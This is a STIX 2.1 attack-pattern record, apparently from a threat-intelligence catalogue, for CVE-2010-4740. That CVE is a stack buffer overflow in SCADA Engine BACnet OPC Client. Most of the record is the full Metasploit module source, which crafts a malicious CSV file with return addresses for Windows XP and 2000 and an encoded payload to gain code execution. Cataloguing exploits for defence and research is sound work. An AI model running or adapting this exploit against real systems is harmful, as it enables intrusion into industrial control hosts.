{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--69b1a309-2bbc-426d-98cc-d75a5847707a",
    "created": "2024-08-14T16:37:18.099607Z",
    "modified": "2024-08-14T16:37:18.099611Z",
    "name": "BACnet OPC Client Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in SCADA Engine BACnet OPC Client v1.0.24. When the BACnet OPC Client parses a specially crafted csv file, arbitrary code may be executed.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/bacnet_csv.rb",
            "external_id": "bacnet_csv.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4740"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-10-264-01"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BACnet OPC Client Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in SCADA\n        Engine BACnet OPC Client v1.0.24. When the BACnet OPC Client\n        parses a specially crafted csv file, arbitrary code may be\n        executed.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Jeremy Brown', 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-4740' ],\n          [ 'OSVDB', '68096'],\n          [ 'BID', '43289' ],\n          [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-10-264-01' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'MinNops'  => 0,\n          'MaxNops'  => 0,\n          'Space'    => 698,\n          'BadChars' =>  Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\xeb\\x03\\x59\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\",\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ECX',\n            },\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP3 English',   { 'Ret' => 0x77e26323 } ],\n          [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29 } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-09-16',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new( 'FILENAME',  [ false, 'The file name.',  'msf.csv' ]),\n      ])\n\n  end\n\n  def exploit\n\n    csv = \"OPC_TAG_NAME,OBJECT_TYPE,INSTANCE,OBJECT_NAME\\n\\\\\"\n    csv << rand_text_alpha_upper(185)\n    csv << [target.ret].pack('V') + rand_text_alpha_upper(4)\n    csv << payload.encoded + rand_text_alpha_upper(750 - payload.encoded.length)\n    csv << \"\\\\scada,0,0,\\n\"\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(csv)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-09-16",
    "x_mitre_platforms": [
        "win'"
    ]
}